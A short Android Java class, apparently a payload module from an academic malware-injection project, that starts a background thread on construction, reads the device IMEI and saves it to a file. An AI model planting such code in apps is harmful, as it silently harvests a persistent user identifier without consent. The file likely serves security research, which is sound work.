package it.unisannio.srss.ame.payloads.imei;

import it.unisannio.srss.ame.payloads.common.Utils;
import it.unisannio.srss.ame.payloads.common.Utils.PrintResult;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;

public class IMEIPayload extends Thread {

	private final static String TAG = IMEIPayload.class.getSimpleName();

	private final Context context;

	public IMEIPayload(Context context) {
		this.context = context;
		start();
	}

	@Override
	public void run() {
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = tm.getDeviceId();
		PrintResult res = Utils.printToFile(this.getClass(), imei);
		if (res == PrintResult.SUCCESS)
			Log.i(TAG, "IMEI saved successful");
		else
			Log.e(TAG, res.name());

	}
}
